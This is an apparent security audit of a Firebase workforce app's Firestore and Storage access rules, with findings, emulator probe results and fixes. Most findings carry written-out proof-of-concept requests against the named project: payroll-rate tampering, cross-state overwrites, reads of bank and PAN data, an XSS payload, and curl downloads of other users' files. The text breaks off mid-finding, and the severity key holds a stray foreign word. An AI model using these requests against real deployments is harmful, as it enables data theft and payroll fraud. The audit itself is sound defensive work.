# CISS Workforce — Firestore & Storage Security Rules Audit

**Auditor:** rules-auditor (shared task `task-1`)
**Targets:** `/Users/mymac/Documents/CISS/firestore.rules` (622 lines), `/Users/mymac/Documents/CISS/storage.rules` (298 lines)
**Repo revision:** `72b55601` (2026-10-01)
**Method:** static analysis of both rulesets against every client-SDK / Admin-SDK call site in `src/`, plus **execution of the real ruleset in the local Firestore emulator** (`~/.cache/firebase/emulators/cloud-firestore-emulator-v1.22.0.jar`, arm64 JDK 21) with an unstyled-but-valid unsigned-JWT principal model. Every finding marked *(reproduced)* below was confirmed by an HTTP request against the emulator loaded with the repo's unmodified `firestore.rules`. The live deployment at `cisskerala.site` was **not** contacted; the rules files were **not** modified.
**Probe artefacts:** `/tmp/rules-probe.mjs`, `/tmp/rules-probe2.mjs` (Appendix A).

Severity key: **Critical** = immediate cross-tenant/匿名 compromise of high-value data or authz; **High** = same-role-boundary bypass of a control the application itself enforces, or exposure of a whole tenant/collection; **Medium** = meaningful over-exposure or control bypass with narrower blast radius; **Low** = hygiene, latent, or low-value exposure.

---

## 1. Summary table

| ID | Sev | Location | One-line |
|----|-----|----------|----------|
| R-01 | High | `firestore.rules:408–411` | `compliance`/non-super `admin` can rewrite global statutory payroll settings via client SDK; the only writer API requires **superAdmin** *(reproduced)* |
| R-02 | High | `firestore.rules:413–416`, `418–420`, `422–424`, `426–429` | `accounts` can write `clientWageConfig`/`payrollCycles`/`salaryStructures`/`employeeSalaries` directly; APIs require **admin** *(reproduced)* |
| R-03 | High | `firestore.rules:92–97` (+ every `writeStateMatches()` rule) | `setDoc()` that omits/rewrites `stateCode` passes `writeStateMatches()` → cross-state overwrite of another state's documents *(reproduced)* |
| R-04 | High (latent Critical) | `firestore.rules:40–42`, `233`, `241`, `249` | `guardAssignedSiteId()` claim is **never minted anywhere in the codebase**; when present it grants every guard the **entire** `clients` and `clientLocations` collections *(reproduced)* |
| R-05 | Medium | `firestore.rules:342–343`, `444` | `attendanceSessions` (and `workOrderTodos`) read via `isStaff()` is not district-scoped → any field officer reads every guard's duty sessions *(reproduced)* |
| R-06 | Medium | `firestore.rules:194` | Client-role users read **raw** `employees` docs incl. `bankAccountNumber`, `ifscCode`, `panNumber`, `epfUanNumber`, `esicNumber` *(reproduced)* |
| R-07 | Medium | `firestore.rules:443–448` | Any staff role creates/updates `workOrderTodos` from the client SDK with no field allowlist, bypassing the admin-only API and its validation *(reproduced)* |
| R-08 | Low | `firestore.rules:174–176` | Self-update of `users/{uid}` blocks only 4 keys; `clientName`/`stateCode`/`assignedDistricts`/`uid` can be attached to one's own doc (no consumer today) *(reproduced)* |
| R-09 | Low | `firestore.rules:482`, `488`, `506` | Unauthenticated read of `districts`, `states`, `enrollmentFormConfig` *(reproduced)* |
| R-10 | Low | `firestore.rules:16–20` | `isGuard()` trusts the email suffix `@guard.cisskerala.app` with no claim requirement; stale vs. the regional domain in use; self-signup reachability needs live check |
| R-11 | Low / Info | `firestore.rules:349–353`, `418–424`, `295–296` | Dead or over-broad rules: guard write surface on unused `attendanceStates` with no field allowlist; unused `salaryStructures`/`employeeSalaries`; `fcmTokens` create broader than read |
| R-12 | Info | `firestore.rules:188`, `283`, `444` | Client-SDK list queries the rules can never satisfy for lower roles → broken UI paths (functionality, not exposure) |
| S-01 | High | `storage.rules:96–97` | Any field officer can read **any other FO's** report evidence (`/foReports/{folder}/{uid}/{file}`) |
| S-02 | High | `storage.rules:114`, `121`, `129` | Any authenticated account can download **every** employee's profile photo, **signature image**, and attendance selfie |
| S-03 | Medium | `storage.rules:17–19`, `21–31`, `96–107`, `204–208` | `image/*` admits `image/svg+xml`; user-controlled `{folder}`; 100 MB limits → stored-XSS/phishing + cost abuse |
| S-04 | Low | `storage.rules:96–107`, `113–134` | Report-bound metadata checks exist only on the 4-segment path; 3-segment path + legacy employee reads lack scoping/limits |

---

## 2. Firestore findings

### R-01 — Global statutory payroll settings are writable by `compliance` and by any plain `admin`
**Severity:** High *(reproduced — probe D3)*
**Location:** `firestore.rules:408–411`

```
408:    match /complianceSettings/{docId} {
409:      allow read: if isAdmin() || isCompliance() || isHR() || isAccounts();
410:      allow write: if isAdmin() || isCompliance();
411:    }
```

**Why it is wrong.** `complianceSettings/global` holds the EPF/EPS/ESIC/PT/TDS parameters the payroll engine reads (`src/lib/payroll/defaults.ts`; consumed at `src/app/api/admin/payroll/run/route.ts:121`, `src/lib/server/region-onboarding.ts:296`). The application's only writer route is gated on **super admin**: `src/app/api/admin/compliance-settings/route.ts:24` → `const decoded = await requireSuperAdmin(request);` (helper at `src/lib/server/auth.ts:91–97`, `role !== "superAdmin"` ⇒ throw). The rules are strictly broader: `isAdmin()` (`firestore.rules:44–50`) is true for `role == 'admin'` and for any token with `admin == true`, and `isCompliance()` (`firestore.rules:64–66`) is true for `role == 'compliance'`.

**Concrete attacker request** (browser console of a signed-in `compliance` user):
```js
import { getFirestore, doc, setDoc } from "firebase/firestore";
const db = getFirestore(app);
await setDoc(doc(db, "complianceSettings", "global"), {
  epf: { employeeRate: 0, employerRate: 0 },
  esic: { employeeRate: 0, employerRate: 0 },
  professionalTax: { slabs: [] },
  tds: { enabled: false },
}, { merge: true });
// emulator probe D3 with token {role:'compliance', stateCode:'KL'} -> HTTP 200 ALLOWED
```
REST equivalent:
```http
PATCH https://firestore.googleapis.com/v1/projects/ciss-workforce/databases/(default)/documents/complianceSettings/global
Authorization: Bearer <compliance-user-ID-token>
{"fields":{"epf":{"mapValue":{"fields":{"employeeRate":{"integerValue":"0"}}}}}}
```
**Why helpers do not stop it.** `writeStateMatches()` is not consulted by this rule at all, and there is no owner/admin-claim check; `isCompliance()` is exactly the low-privilege role the route deliberately excludes.

**Impact.** A non-super-admin role can rewrite the statutory rates that drive every payslip (EPF/ESIC/PT/TDS), silently under-withholding and producing non-compliant wagesheets for all clients — the highest-integrity document class in this system, and one with statutory filing exposure.

**Fix.** `allow write: if isSuperAdmin();` (and decide deliberately whether `admin` — as opposed to `superAdmin` — should ever write it; if so, make the route and the rule agree).

---

### R-02 — `accounts` writes wage configuration and payroll cycles that the APIs gate to `admin`
**Severity:** High *(reproduced — probes D4, D5)*
**Location:** `firestore.rules:413–416`, `418–420`, `422–424`, `426–429`

```
413:    match /clientWageConfig/{configId} {
414:      allow read: if isAdmin() || isAccounts();
415:      allow write: if isAdmin() || isAccounts();
416:    }
418:    match /salaryStructures/{structureId} {
419:      allow read, write: if isAdmin() || isAccounts();
422:    match /employeeSalaries/{salaryId} {
423:      allow read, write: if isAdmin() || isAccounts();
426:    match /payrollCycles/{runId} {
427:      allow read: if isAdmin() || isAccounts() || isHR();
428:      allow write: if isAdmin() || isAccounts();
```

**Why it is wrong.** `src/app/api/admin/clients/[id]/wage-config/route.ts:29` (`requireAdmin`) and `src/app/api/admin/payroll/cycles/route.ts:7` (`requireAdmin`) are the app's write paths; `requireAdmin` = `hasAdminAccess` = `admin === true || role === 'admin' || role === 'superAdmin'` (`src/lib/server/auth.ts:34–40`). An `accounts` token fails that check on the server but passes the rules. `clientWageConfig` is the per-client rate/billing config consumed by `src/app/api/admin/payroll/run/route.ts:180` and `.../payroll/validate/route.ts:44`; `payrollCycles` carries cycle state (`status`, finalisation).

**Concrete attacker request:**
```js
// signed in as role=accounts
await setDoc(doc(db, "clientWageConfig", "<clientId>"),
  { basicWage: 1, hra: 0, allowances: [] }, { merge: true });          // probe D4 -> 200
await setDoc(doc(db, "payrollCycles", "<cycleId>"), { status: "paid" }); // probe D5 -> 200
```
**Why helpers do not stop it.** No `writeStateMatches()` owner check, no field allowlist, no "cycle finalised" immutability guard — everything the route validates is optional for a direct client write.

**Impact.** An accounts clerk can rewrite billable/client wage rates and payroll-cycle state (e.g. mark a cycle paid, or zero a rate) without leaving the audit trail the route writes (`lastUpdatedBy`), then let the UI read back the tampered values.

**Fix.** Align each rule with its route gate: `clientWageConfig`/`payrollCycles`/`salaryStructures`/`employeeSalaries` → `isAdmin()` only (or add `isSuperAdmin()` where the route does), plus explicit field allowlists for cycle state transitions.

---

### R-03 — `writeStateMatches()` is decided by the *incoming* document, so `setDoc` crosses state boundaries
**Severity:** High *(reproduced — probes C4, C5)*
**Location:** `firestore.rules:92–97`; consumed by `195`, `234`, `242`, `250`, `258`, `266`, `285`, `287`, `325`, `335`, `344`, `351`, `365`, `445`, `446`, `458`, `459`, `483`, `507`, `513`

```
92:    function writeStateMatches() {
93:      return !('stateCode' in request.resource.data) ||
94:        userStateCode() == null ||
95:        request.resource.data.stateCode == userStateCode() ||
96:        isSuperAdmin();
97:    }
```

**Why it is wrong.** For an **update** the rule is evaluated against `request.resource.data`, which is the post-write document supplied by the *caller*. `setDoc(ref, data)` (and `batch.set`/`transaction.set`) replaces the document body, so the attacker chooses whether `stateCode` exists and what it equals:
* `setDoc(tnDoc, { ..., stateCode: 'KL' })` → clause 95 true → allowed.
* `setDoc(tnDoc, { ... })` with `stateCode` omitted → clause 93 true → allowed **and the field is deleted from the document**, which then makes it readable by every state through `readStateMatches()` clause 86.

Note `updateDoc()` with a merge mask behaves correctly (the merged doc keeps `stateCode: 'TN'` and is denied), so the exploit is specific to replacement semantics — which is what `setDoc` gives, and what the UI/server code uses for these collections (`payrollEntries` writes at `src/app/api/attendance/submit/route.ts` pattern; `clientWageConfig` at `src/app/api/admin/clients/[id]/wage-config/route.ts:41` uses `.set(`).

**Concrete attacker request** (an `accounts` user whose token carries `stateCode: 'KL'`):
```js
await setDoc(doc(db, "payrollEntries", "<TN-entry-id>"),
  { amount: 999999, stateCode: "KL" }, { merge: false });  // C4 -> 200 ALLOWED
await setDoc(doc(db, "payrollEntries", "<TN-entry-id>"),
  { amount: 1 }, { merge: false });                        // C5 -> 200 ALLOWED (stateCode dropped)
```
**Why helpers do not stop it.** `readStateMatches()` (85–90) protects reads and is evaluated on stored `resource.data` — that part works (probe C1 correctly denies a KL field-officer reading a TN employee; C2 correctly denies a principal with no `stateCode` claim, because the undefined-claim read errors — see §4). Only the **write** predicate is caller-controlled.

**Impact.** Cross-state tampering/overwrite of any collection whose write rule uses `writeStateMatches()`: `employees`, `clients`, `sites`, `clientLocations`, `workOrders`, `payrollEntries`, `attendanceLogs`, `attendanceState`, `notifications`, `districts`, `enrollmentFormConfig`, `regionSetupProgress`. Severity assumes more than one region/state is populated — **needs-live-verification** on whether `states/` currently holds more than one live state (the scaffolding at `firestore.rules:474–515` and `REGION_CODE` usage in `src/app/api/wizard/*` suggest yes).

**Fix.** Never let the caller choose the scope field. Use `resource.data.stateCode` for updates, e.g.
`(!('stateCode' in request.resource.data) && (!exists(/databases/$(database)/documents/$(request.path)) || resource.data.stateCode == userStateCode()))`, or require `request.resource.data.stateCode == resource.data.stateCode` on update, and consider blocking `stateCode` mutation outright via an affected-keys check.

---

### R-04 — `guardAssignedSiteId()` is never set, and when set it hands guards the *entire* client roster
**Severity:** High — latent **Critical** if the claim is ever populated *(reproduced — probes B1–B5)*
**Location:** `firestore.rules:40–42` (helper), used at `233` (`clients`), `241` (`sites`), `249` (`clientLocations`)

```
39:    // Returns the site ID the guard is currently assigned to (from custom claims)
40:    function guardAssignedSiteId() {
41:      return request.auth.token.assignedSiteId;
42:    }
...
230:    match /clients/{clientId} {
231:      allow read: if readStateMatches() && (isStaff() ||
232:        isOwnClientDoc('companyName') ||
233:        (isGuard() && guardAssignedSiteId() != null));
...
246:    match /clientLocations/{locationId} {
247:      allow read: if readStateMatches() && (isStaff() ||
248:        isOwnClientDoc('clientName') ||
249:        (isGuard() && guardAssignedSiteId() != null));
```

**Two defects in one branch.**
1. **It does not scope anything.** The predicate is `assignedSiteId != null` — it never compares the claim to anything on the document. So any guard holding the claim reads **all** `clients` (company names, rates, contacts, GST/operational metadata) and **all** `clientLocations` (site coordinates), for every client and tenant.
2. **The claim does not exist.** Repo-wide search finds `assignedSiteId` **only** in `firestore.rules:41`. Guard tokens are minted with exactly three claims at `src/app/api/guard/auth/login/route.ts:285–289` (`role: "guard"`, `employeeId`, `employeeDocId`), and the same shape at `signup/setup-pin/route.ts:258–261` and `reset-pin/route.ts:87–91`. `git log -S assignedSiteId` shows the helper was *introduced* in commit `765da1e4` ("fix: harden Firestore security rules…", 2026-06-02) with no code adding the claim, before or since.

**Concrete attacker request** — rules-level confirmation with a guard token carrying the claim:
```js
// token claims: {role:'guard', employeeDocId:'emp-1', assignedSiteId:'site-1'}
await getDocs(collection(db, "clients"));        // probe B3 -> 200, every client returned
await getDoc(doc(db, "clients", "OTHER"));       // probe B2 -> 200 foreign tenant
await getDoc(doc(db, "clientLocations", "loc1"));// probe B4 -> 200 foreign site coordinates
```
REST:
```http
GET .../documents/clients?pageSize=100
Authorization: Bearer <guard-ID-token with assignedSiteId claim>
```
**Why helpers do not stop it.** `readStateMatches()` passes for all legacy docs (clause 86) and for any guard without a `stateCode` claim the branch is reached only when the doc has no `stateCode`; the client-scoping helpers (`isOwnClientDoc`) are irrelevant because this is a *separate* OR branch.

**Impact (today).** The claim is absent, so probes B1 (`DENY`) show no exploit is live. The real, shipped bug is the **inverse**: because `guardAssignedSiteId()` is `undefined`, the guard's *own* site read at `firestore.rules:241` (`resource.data.siteId == guardAssignedSiteId()`) can never be satisfied → guards cannot read their own site document through the client SDK (fail-closed, but a silent functional break that masks how untested this branch is).

**Impact (the moment the claim is added).** The very next person to "fix" guard site scoping by minting `assignedSiteId` activates an immediate cross-tenant leak of the full client + location master data to every guard. This is the highest-leverage latent defect in the ruleset.

**Fix.** Replace the branch with a real comparison, and scope through the site's owning client:
```
(isGuard() && guardAssignedSiteId() != null &&
 exists(/databases/$(database)/documents/sites/$(guardAssignedSiteId())) &&
 get(/databases/$(database)/documents/sites/$(guardAssignedSiteId())).data.clientName == resource.data.companyName)
```
for `clients`, and `resource.data.siteId == guardAssignedSiteId()` / `resource.data.clientName == get(...).data.clientName` for `clientLocations`. If guards genuinely need no client master data, delete the branch instead. Either way, decide the claim contract explicitly and cover it with emulator tests (Appendix A).

**Needs-live-verification:** whether any out-of-band process (Firebase console, an older deployed build, or an admin script outside this repo) has ever populated `assignedSiteId`, and whether deployed guards currently hold it. Confirm by decoding a live guard ID token, or by re-running probes B2–B4 against the deployed ruleset.

---

### R-05 — Field officers read every guard's duty sessions (no district scope)
**Severity:** Medium *(reproduced — probe F9)*
**Location:** `firestore.rules:341–346` (and the same `isStaff()` shape at `444` for `workOrderTodos`)

```
341:    match /attendanceSessions/{sessionId} {
342:      allow read: if readStateMatches() && (isStaff() ||
343:        (isGuard() && resource.data.employeeDocId == guardEmployeeDocId()));
```

**Why it is wrong.** `isStaff()` (`firestore.rules:155–157`) includes `isFieldOfficer()`. Everywhere else the rules deliberately confine a field officer to their assigned districts (`isFieldOfficerForEmployee` at `115–140`, `isFieldOfficerForDistrict` at `108–113`, and the `guardLocations` branch at `597–599`). `attendanceSessions` is the exception: the payload written at `src/app/api/attendance/submit/route.ts:850–860` contains `employeeId`, `employeeDocId`, `employeeName`, `siteId`, `siteName`, `dutyPointId`, `dutyPointName`, `clientName`, `status`, `attendanceDate` — i.e. the full attendance/duty record for every guard.

**Concrete attacker request** (field officer scoped to `Ernakulam`):
```js
await getDoc(doc(db, "attendanceSessions", "<any-session-id>"));  // probe F9 -> 200 for a Kollam session
```
**Why helpers do not stop it.** `readStateMatches()` only compares `stateCode`; the FO's own district boundary is never consulted for this collection.

**Impact.** Any field officer can enumerate and read the duty sessions (who was on duty, where, when, for which client) of every guard in the state — a cross-district leak of operational and personal movement data, inconsistent with the district model the rest of the rules implement and with the UI's own client-side scope checks.

**Fix.** Replace `isStaff()` with the explicit tiers used elsewhere:
`(isAdmin() || isHR() || isAccounts() || isCompliance() || isFieldOfficerForDistrict(resource.data.district) || (isGuard() && resource.data.employeeDocId == guardEmployeeDocId()))`,
after confirming which district field these docs carry (they currently carry none — see R-12/§5, which is why a plain district predicate needs the field added at write time).

---

### R-06 — Client-role users read raw employee documents, including bank and PAN data
**Severity:** Medium *(reproduced — probe D1)*
**Location:** `firestore.rules:187–197`, branch at `194`

```
188:      allow read: if readStateMatches() && (isAdmin() || isHR() || isAccounts() || isCompliance() ||
...
194:        isOwnClientDoc('clientName'));
```

**Why it is wrong.** The comment above this block (`firestore.rules:181–182`) says *"Public profile access now goes through a server route backed by Admin SDK. Raw employee docs are no longer anonymously readable."* The rules then hand the **raw** document to a client-role user. The raw `employees` doc carries the sensitive identity/financial set the server views are careful about — `panNumber`, `bankAccountNumber`, `ifscCode`, `epfUanNumber`, `esicNumber` are all read from these documents in `src/lib/server/guard-profile-view.ts:131,136,137,139,140`, and that file maintains *separate*, narrower serializers for field officers vs. admins. Aadhaar alone is split out (`employeeAadhaarPrivate`, denied at `201–203`), so the design intent is clearly field-level minimisation — which this branch bypasses.

**Concrete attacker request** (client user mapped to `clientName = "ACME"`):
```js
const snap = await getDoc(doc(db, "employees", "<employeeDocId>"));
console.log(snap.data().bankAccountNumber, snap.data().panNumber, snap.data().ifscCode);
// probe D1: doc with clientName ACME -> 200 ALLOWED, full body returned
```
**Why helpers do not stop it.** `isOwnClientDoc` only checks the tenant label (`clientFieldName == clientUserClientName()`), never the field set.

**Impact.** A client organisation's portal login obtains its guards' bank account numbers, IFSC codes and PANs — data the server views were designed to keep behind FO/admin tiers. Tenant-scoped (they cannot cross to another client — probe D2 correctly denies), but a real data-minimisation/contractual exposure and a strong phishing/identity-fraud substrate. Whether this is *intended* needs product confirmation; if yes, it should be documented and narrowed to a projected view.

**Fix.** Move client-role reads of employees to a server route returning only whitelisted fields (reuse `serializeGuardProfileView`), and delete the `isOwnClientDoc('clientName')` branch from the `employees` rule.

---

### R-07 — Any staff role can create/update `workOrderTodos` from the client SDK, bypassing the admin API
**Severity:** Medium *(reproduced — probe E5)*
**Location:** `firestore.rules:443–448`

```
443:    match /workOrderTodos/{todoId} {
444:      allow read: if readStateMatches() && (isStaff());
445:      allow create: if isStaff() && writeStateMatches();
446:      allow update: if readStateMatches() && writeStateMatches() && (isAdmin() || resource.data.assignedTo == request.auth.uid);
447:      allow delete: if isAdmin() && readStateMatches();
448:    }
```

**Why it is wrong.** The app's only writer is `/api/admin/work-orders/todos` (`src/app/api/admin/work-orders/todos/route.ts:29,72`), which is admin-gated and validates the payload. The rules let **any** staff principal — `hr`, `accounts`, `compliance`, `fieldOfficer` — create a todo with **any fields and any content**, and (line 446) then update that same document arbitrarily by first setting `assignedTo` to their own uid.

**Concrete attacker request** (field officer):
```js
await setDoc(doc(db, "workOrderTodos", "t1"), {
  assignedTo: uid, workOrderId: "<any>", title: "<img src=x onerror=alert(1)>",
  body: "…", stateCode: "KL"
});   // probe E5 -> 200 ALLOWED
await updateDoc(doc(db, "workOrderTodos", "t1"), { title: "…", status: "done" }); // line 446 allows (assignedTo == uid)
```
**Why helpers do not stop it.** No field allowlist on create (contrast `users` create at `168–172`, which does have one) and no `workOrderId` ownership/assignment check.

**Impact.** Server-side invariants (work-order linkage, assignment conflict, quota, audit fields) are all optional. Content is attacker-authored from a low-privilege role: if the todo title/body is rendered unsanitised in the admin dashboard, this is a stored-XSS pivot from `fieldOfficer` → admin session context. Needs-live-verification of the render path (`src/app/(app)/work-orders/*`).

**Fix.** Make writes server-only (`allow create, update, delete: if false;`) and let `/api/admin/work-orders/todos` (Admin SDK) handle them, or add `keys().hasOnly([...])` plus a `resource.data.assignedTo == request.auth.uid` condition on create.

---

### R-08 — Self-service update of `users/{uid}` attaches scope-bearing fields to one's own doc
**Severity:** Low *(reproduced — probes E1, E2)*
**Location:** `firestore.rules:163–178`, update branch at `174–176`

```
174:      allow update: if isAdmin() || (isSignedIn() && request.auth.uid == uid &&
175:        // Guards can only update safe fields — not role or employeeDocId
176:        !request.resource.data.diff(resource.data).affectedKeys().hasAny(['role', 'employeeDocId', 'employeeId', 'admin']));
```

**Why it is wrong (partially).** The deny-list is correct for its stated purpose — probe E1 confirms `users/{uid}` cannot gain `role: 'admin'`. But the create path has a *field allowlist* (`keys().hasOnly([...])`, 168–172) while the update path has only the 4-key deny-list, so a user can attach `clientName`, `stateCode`, `assignedDistricts`, or rewrite `uid` on their own document (probe E2 → 200 ALLOWED). This matters only if something downstream trusts those fields.

**Concrete attacker request:**
```js
await updateDoc(doc(db, "users", uid), {
  clientName: "ACME", stateCode: "KL", assignedDistricts: ["Ernakulam"]
});  // probe E2 -> 200 ALLOWED
```
**Why helpers do not stop it.** The diff deny-list is exhaustive only for the four named keys.

**Impact.** No exploit today: no code found in `src/` derives authorization from a `users/{uid}` document (`getCustomUserClaims` / decoded-token claims are used throughout; grep for `collection("users")` returns nothing). Recorded as **latent**: the moment a server route reads role/scope from the user doc (a common refactor), self-service writes become privilege escalation.

**Fix.** Apply the same `hasOnly` allowlist to update, or restrict updates to `displayName`/`phone`/`updatedAt`/`setupComplete` and make everything else Admin-SDK-only.

---

### R-09 — Unauthenticated reads of `districts`, `states`, `enrollmentFormConfig`
**Severity:** Low *(reproduced — probes E3, E4)*
**Location:** `firestore.rules:481–490`, `505–509`

```
481:    match /districts/{districtId} {
482:      allow read: if true;
...
487:    match /states/{stateId} {
488:      allow read: if true;
...
505:    match /enrollmentFormConfig/{docId} {
506:      allow read: if true;
```

**Concrete attacker request** (no credentials at all):
```
GET https://firestore.googleapis.com/v1/projects/ciss-workforce/databases/(default)/documents/districts/ernakulam
   -> 200 (probe E3)
GET .../documents/enrollmentFormConfig/main   -> 200/404-not-403 (probe E4; rule allows)
```
**Why it is wrong.** Master/scaffold data is exposed anonymously with no tenant filter; `states`/`districts` documents also carry `stateCode`/region metadata (`src/types/branch.ts:21,63`), and `enrollmentFormConfig` (line 189 of `src/lib/enrollment-config.ts` filters `aadharNumber`) drives KYC form structure.

**Impact.** Anonymous enumeration of the organisation's regional/district footprint and internal form schema. Low direct harm; it is free reconnaissance and should be an authenticated read (or served from a scrubbed public route as the ruleset does elsewhere).

**Fix.** `allow read: if isSignedIn();` (or explicit public projection) for all three.

---

### R-10 — `isGuard()` accepts any Auth account bearing the `@guard.cisskerala.app` email suffix
**Severity:** Low (latent) — needs-live-verification
**Location:** `firestore.rules:15–20`

```
15:    function isGuard() {
16:      return isSignedIn() && (
17:        request.auth.token.role == 'guard' ||
18:        request.auth.token.email.matches('.*@guard\\.cisskerala\\.app')
19:      );
20:    }
```

**Why it is questionable.** The guard identity model is **custom-token** based: `/api/guard/auth/login` mints the token server-side after PIN verification (`src/app/api/guard/auth/login/route.ts:280–289`), and the client signs in with `signInWithCustomToken` (`src/app/guard-login/page.tsx:34,89`). The email predicate therefore adds nothing legitimate, but it makes *guard identity a property of an email address*. Email/Password auth **is** enabled for staff (`src/app/admin-login/page.tsx:105` uses `signInWithEmailAndPassword`), so if signup is not disabled for the project, `POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>` with `{"email":"attacker@guard.cisskerala.app", ...}` yields a token that satisfies `isGuard()` with no claims. **Needs-live-verification** — confirm whether `accounts:signUp` is accepted for this project (source alone cannot tell).

**Empirically checked and currently harmless:** probes A1–A4 show a claim-less guard-email token obtains nothing material — every other `isGuard()` branch additionally requires `employeeDocId`/`employeeId`/`assignedSiteId`, and the undefined-claim reads error to deny (probe A1 message: *"Property admin is undefined on object"*). The `role == 'guard'` claim is the load-bearing check.

**Also stale:** `src/app/api/admin/fix-email-verified/route.ts:17` recognises a *second* guard domain, `@guard.KL.ciss-regional.app` (built from `src/lib/runtime-config.ts:45`). Tokens minted for the regional deployment match neither the regex nor any claim-less expectation. Any future decision to rely on the email predicate must handle both domains.

**Fix.** Delete the email-suffix arm and require `role == 'guard'`; if a fallback is needed, use an explicit `guardDomain` claim. Separately confirm Identity Toolkit signup is disabled, and add an Admin-SDK guard-account inventory check.

---

### R-11 — Dead or over-broad rules
**Severity:** Low / Informational
**Location:** `firestore.rules:348–353`, `418–424`, `290–307`

1. **`attendanceStates` (legacy plural) — guard write with no field allowlist** *(dead collection)*
```
348:    // Legacy plural collection — retained for backwards-compatibility only
349:    match /attendanceStates/{employeeId} {
350:      allow read: if readStateMatches() && (isAdmin() || (isGuard() && guardEmployeeDocId() == employeeId));
351:      allow create, update: if (isAdmin() || (isGuard() && guardEmployeeDocId() == employeeId)) && writeStateMatches();
```
   Nothing in `src/` reads or writes `attendanceStates` (only the singular `attendanceState` is used: `src/app/api/attendance/submit/route.ts:419`, `.../validate/route.ts:73`, etc.). The rule therefore grants guards an unrestricted write surface (any fields, any content, no size/shape limits) on a collection no one reads — a dormant injection point if any consumer ever appears. Note also the comment at `329–331` ("Guards can only write allowed fields to prevent arbitrary data injection") sits above the **singular** `attendanceState`, whose rule is admin-only (`332–337`) — the comment describes neither collection accurately.
   **Fix.** Delete the `attendanceStates` block (and the stale comment), or bring it under the same admin-only rule as `attendanceState`.

2. **`salaryStructures` / `employeeSalaries` — full read/write for `isAdmin() || isAccounts()` on collections the app never touches** (`418–424`). Confirmed absent from `src/` by grep. Either wire them to a server route or drop the rules; today they are an unused, broadly-writable surface (and, per R-03, cross-state).

3. **`fcmTokens`: create broader than read** (`294–307`). Create/update allow any signed-in user to write their own token doc (`296–303`), while read is `isAdmin()` only (`295`) — a principal may write documents it cannot read back. Harmless in itself, but the asymmetry is unintentional; also `request.auth.uid` is interpolated into a regex (`297`) — safe only because Firebase uids are `[A-Za-z0-9]`-only, worth a comment/anchoring.

---

### R-12 — Client-SDK list queries the rules can never satisfy (functionality, not exposure)
**Severity:** Informational
**Location:** `firestore.rules:188`, `283`, `444`; call sites in `src/`

* `src/app/(app)/settings/data-export/page.tsx:146` builds `query(collection(db, "employees"))` with optional filters. Probes F16 (client) and F17 (field officer) both **DENY** — resource-scoped predicates cannot be proven for a `list`. HR/accounts succeed (probe F18 → 200), because their branch is role-only.
* `src/app/(app)/work-orders/[siteId]/page.tsx:589–594` runs `where("district","in",scope)` against `workOrders`; the rule's `isFieldOfficerForDistrict(resource.data.district)` (`283`) is not provable from a query constraint, so FO list views are denied by rules even though the server routes serve the same data.
* `src/app/(app)/settings/qr-management/page.tsx:38` lists `employees`; denied for non-admin roles.

This is the *safe* direction of failure (deny), but it means these pages silently rely on the API layer for lower roles while appearing to use Firestore. Flagged so the Lead can decide whether to remove the client-SDK paths or add query-shaped rules.

---

## 3. Storage findings

Storage rules were analysed statically; the `cloud-storage-rules-runtime` `check`/`serve` subcommands in the cached emulator jar are not usable non-interactively (`check` returns *"This command is not currencly supported."*, `serve` rejects options), so these findings are **confirmed from ruleset source** — the predicates (`isSignedIn()`, `isFieldOfficer()`) are unambiguous — while the *impact* depends on objects existing at those paths (**needs-live-verification** via a Storage listing/`gsutil ls` on the live bucket).

### S-01 — Any field officer can read any other field officer's report evidence
**Severity:** High
**Location:** `storage.rules:96–107` (read predicate at `97`)

```
 96:    match /foReports/{folder}/{uid}/{fileName} {
 97:      allow read: if isAdmin() || isFieldOfficer();
 98:      allow create: if isFieldOfficer() && request.auth.uid == uid && (
```

**Why it is wrong.** The read predicate checks only the *role*, never `request.auth.uid == uid`, never a report/assignment binding, and never the folder. The app writes exactly this 3-segment shape for the non-report-bound ("legacy") upload branch: `src/components/field-officers/photo-capture.tsx:253` → `` `foReports/${folder}/${user.uid}/${timestamp}_${file}` ``. Note the intended private path is the 4-segment rule at `80–93`, which *does* require `metadata.reportId`/`metadata.uploaderId` and denies reads (`81`). This 3-segment rule undermines that model.

**Concrete attacker request** (any `fieldOfficer` ID token; `uid2` is a colleague):
```bash
curl -H "Authorization: Bearer $FO_ID_TOKEN" \
  "https://firebasestorage.googleapis.com/v0/b/ciss-workforce.firebasestorage.app/o/foReports%2FvisitReportFiles%2F<uid2>%2F1730000000000_evidence.jpg?alt=media" \
  -o stolen.jpg      # allowed by isFieldOfficer() alone
```
Client SDK: `getDownloadURL(ref(storage, "foReports/visitReportFiles/<uid2>/<file>"))`.
**Why helpers do not stop it.** There is no ownership or report-scope helper in the predicate; `isDocument()`/size checks apply to writes, not reads.

**Impact.** Cross-officer (and cross-district/cross-client) exfiltration of field-visit/training evidence photos and PDFs — the material the report-attachment server code (`src/lib/reports/report-attachments.server.ts:28`, which enforces an `expectedPrefix` per report) exists to protect. Any one field officer account is a full read key for all evidence.

**Fix.** Delete the 3-segment rule, or make it `allow read: if isAdmin() || (isFieldOfficer() && request.auth.uid == uid);` and move the app's legacy path onto the report-bound prefix.

---

### S-02 — Every employee's signature image, profile photo and attendance selfie is readable by any authenticated account
**Severity:** High
**Location:** `storage.rules:113–134` (read predicates at `114`, `121`, `129`)

```
113:    match /employees/{employeeKey}/profilePictures/{fileName} {
114:      allow read: if isSignedIn();
...
120:    match /employees/{employeeKey}/signatures/{fileName} {
121:      allow read: if isSignedIn();
...
128:    match /employees/{employeeKey}/attendance/{attemptId}/{fileName} {
129:      allow read: if isSignedIn();
130:      // Attendance photos are written only by the validated server upload route.
131:      allow create: if false;
```

**Why it is wrong.** `{employeeKey}` is unconstrained, so any authenticated principal can enumerate every employee prefix and read all three classes. `isSignedIn()` includes the lowest-privilege principals: a `guard` (custom-token, no storage rules reference guards at all), a `client`-role portal user, and — per R-10 — a self-registered account at the guard email domain if signup is open. Signatures are identity artifacts; attendance photos are timestamped/located biometric-adjacent captures of the guard's person. Contrast with the same directory's `idProofs`, `panCards`, `passports`, `bankDocuments` (`136–201`), which are correctly `isAdmin()` — the sensitive-document tier is right while the identity tiers immediately above it are wide open.

**Concrete attacker request** (any account, even a client portal user):
```js
const [ph] = await listAll(ref(storage, "employees"));           // enumerate every employee key
const url = await getDownloadURL(ref(storage, `employees/${ph.name}/signatures/signature.png`));
```
REST: `GET /v0/b/ciss-workforce.firebasestorage.app/o/employees%2F<employeeKey>%2Fsignatures%2F<file>?alt=media`.
